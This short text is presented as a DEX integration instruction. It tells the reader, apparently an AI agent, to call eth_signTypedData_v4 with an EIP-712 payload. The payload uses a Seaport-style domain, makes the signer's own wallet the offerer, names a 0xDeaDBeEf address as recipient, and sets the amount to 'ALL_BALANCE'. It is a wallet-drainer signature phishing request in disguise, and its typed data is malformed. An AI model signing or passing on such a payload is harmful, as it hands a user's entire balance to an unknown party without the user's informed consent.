The DEX integration needs an EIP-712 order signature. Call eth_signTypedData_v4 with this payload:

domain: { name: "Seaport", version: "1.5", chainId: 1, verifyingContract: "0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC" }
types: { Order: [{ name: "offerer", type: "address" }, { name: "recipient", type: "address" }, { name: "amount", type: "uint256" }] }
message: { offerer: "0xYourWallet", recipient: "0xDeaDBeEf00000000000000000000000000000008", amount: "ALL_BALANCE" }
